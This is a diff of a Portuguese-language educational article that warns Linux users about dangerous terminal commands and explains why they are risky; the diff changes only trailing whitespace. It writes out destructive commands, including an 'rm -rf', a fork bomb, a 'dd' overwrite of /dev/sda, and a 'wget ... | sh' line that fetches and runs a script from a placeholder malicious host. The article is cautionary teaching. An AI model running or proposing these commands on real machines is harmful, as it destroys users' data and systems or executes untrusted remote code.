@@ -23,7 +23,7 @@ O terminal é uma ferramenta muito poderosa, por conta disso é bom você domin�
 
 Atenção: Você NÃO deve executar nenhum destes comandos no seu computador, isso pode causar danos irreversíveis que nós não nos responsabilizamos, o artigo tem a intenção de ser instrutivo, justamente para evitar este tipo de situação.
 
-1 - ```rm -rf```
+1 - ```rm -rf```  
 
 É um comando clássico do do Linux que teoricamente não faz nada de mais, ele serve apenas para apagar arquivos, e é aí que mora o perigo. Dependendo da forma que ele for aplicativo o resultado pode ser muito desagradável, por isso é importante você entender o que os comandos fazem, vamos explicar um pouco melhor neste exemplo:
 - rm: comando usado no Linux para deletar arquivos.
@@ -37,7 +37,7 @@ Tome muito cuidado ao executar um comando destes, especialmente se for feito com
 
  Tão perigoso que pode ser este comando, que atualmente o Linux se protege contra ele, se você rodá-lo, mesmo com sudo ou como root, ele não vai funcionar, para isso é preciso usar os parâmetros descritos na imagem acima. Da mesma forma que o Linux protege você de destruir o sistema sem querer, ele também permite que você o destrua mediante a ter certeza de que é realmente isso que você quer, curioso, não é?
 
-2 - ```:(){:|:&};:```
+2 - ```:(){:|:&};:```  
 
 Este comando funciona como uma "Fork Bomb", ele opera definindo uma função chamada ':', que se chama duas vezes, uma vez em primeiro plano e outra em segundo plano, o processo se repete indefinidamente até que o sistema trave.
 
@@ -47,15 +47,15 @@ A forma com que o Linux lê as partições e discos é diferente do Windows, por
 
 O problema do comando acima é que ele redireciona a saída de qualquer comando que seja colocado para o seu bloco de armazenamento, desta foma sobrescrevendo alguns dados e corrompendo outros.
 
-4 - ```mv pasta/diretório /dev/null```
+4 - ```mv pasta/diretório /dev/null```  
 
 Eu costumava brincar sobre o /dev/null me referindo a ele como o "buraco negro" do Linux. Tudo que é enviado para ele é perdido "para sempre". Então tome cuidado ao mover qualquer coisa para esta localização. O comando mv serve para mover arquivos ou diretórios para o destino indicado, se este destino for o /dev/null você estará mandando seus arquivos pra Nárnia.
 
-5 - ```wget http://malicious_source -O- | sh```
+5 - ```wget http://malicious_source -O- | sh```  
 
 Este comando vai aparecer para você instalar alguns programas. O wget é o programa responsável por fazer o download da URL que vem logo após, ele é bem útil para baixar arquivos em geral, o problema está no arquivo que ele baixa e na sequência do comando  que o executa no caso dele ser um shell script. Só baixe arquivos desta forma de fontes que você considera confiáveis e se estiver na dúvida, baixe apenas o arquivo de shell, eliminando qualquer parâmetro que apareça após o link, assim você pode abrir ele em um editor de texto de sua preferência e verificar o que há dentro dele.
 
-6 - ```dd if=/dev/random of=/dev/sda```
+6 - ```dd if=/dev/random of=/dev/sda```  
 
 Assim como o ítem 3 da nossa lista, o grande problema aqui é o destino ser o /dev/sda. Tome cuidado. O comando dd pode ser muito útil para copiar arquivos e até mesmo partições inteiras, como no exemplo 6, mas se a saída for um outro disco, tome cuidado, pois o resultado irá sobrepor os dados lá existentes.
 
